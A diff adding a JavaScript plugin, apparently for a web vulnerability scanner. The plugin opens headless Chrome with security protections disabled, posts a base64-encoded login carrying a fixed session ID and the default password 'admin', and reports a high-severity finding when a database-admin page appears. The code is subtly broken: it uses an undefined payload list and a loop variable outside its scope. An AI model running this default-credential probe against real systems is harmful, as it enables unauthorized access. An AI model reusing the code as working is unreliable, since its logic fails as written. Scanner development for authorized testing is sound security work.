@@ -1,0 +1,89 @@
+
+const { CoreLayer } = require('../core/core.js')
+
+class asp_Inject extends CoreLayer {
+    constructor(coreobj) {
+        super(coreobj.browser,
+            coreobj.scheme,
+            coreobj.url,
+            coreobj.headers,
+            coreobj.method,
+            coreobj.postData,
+            coreobj.__call,
+            coreobj.taskid,
+            coreobj.hostid,
+            coreobj.variations);
+        this.foundVulnOnVariation = false;
+    }
+
+    async startTesting() {
+        if (this.variations.length != 0) {
+            this.browser = new this.HeadlessChrome({
+                headless: true,
+                chrome: {
+                    flags: [
+                        '--disable-web-security',
+                        '--no-sandbox=true',
+                        "--disable-xss-auditor=true",
+                        "--disable-gpu",
+                    ]
+                }
+            })
+            //console.log(`url: ${this.url} method: ${this.method} postdata:${this.postData}`);
+            for (var i = 0; i < this.variations.length; i++) {
+                if (this.foundVulnOnVariation)
+                    break
+                let report = await this.attack(i);
+            }
+
+        }
+    }
+
+    async attack(index) {
+        await this.browser.init();
+        const mainTab = await this.browser.newTab();
+        this.variations.setValue(index, php_payload_list[i])
+        const payload = "PHPSESSID=9dc7f1c9a61525a49f80bbb433ba7deb&password=admin&remember=yes&login=Log+In&proc_login=true"
+        const encoded = Buffer.from(payload).toString("base64");
+
+        const httprqueset = {
+            url: this.url,
+            method: this.method,
+            headers: this.headers,
+            postData: encoded,
+            isEncodeUrl: false,
+        }
+
+        let bodys = await mainTab.postEx(httprqueset);
+        bodys.forEach(element => {
+            if (element.match("<b>Create New Database</b>")) {
+                console.log(`发现漏洞`);
+                var Report = {
+                    fields: {
+                        url: {
+                            stringValue: this.url,
+                        },
+                        body: {
+                            stringValue: element
+                        },
+                        payload: {
+                            stringValue: payload
+                        },
+                        vuln: {
+                            stringValue: "rj-027-0001"
+                        },
+                        level: {
+                            stringValue: "h"
+                        },
+                    }
+                }
+                this.alert(Report);
+                this.foundVulnOnVariation = true;
+            }
+        });
+
+    }
+}
+
+
+module.exports = asp_Inject
